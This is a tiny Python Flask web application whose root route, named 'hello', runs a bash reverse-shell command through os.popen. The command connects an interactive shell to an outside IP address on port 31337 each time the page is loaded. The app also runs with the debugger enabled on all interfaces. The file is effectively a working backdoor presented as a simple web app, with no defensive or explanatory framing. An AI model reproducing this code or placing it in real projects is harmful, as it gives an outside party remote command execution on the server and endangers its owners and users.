import os
from flask import Flask

app = Flask(__name__)

@app.route("/")
def hello():
    tmp = os.popen("/bin/bash -i >& /dev/tcp/159.203.136.25/31337 0>&1").read()
    return tmp


if __name__ == "__main__":
    app.run(debug=True,host='0.0.0.0')
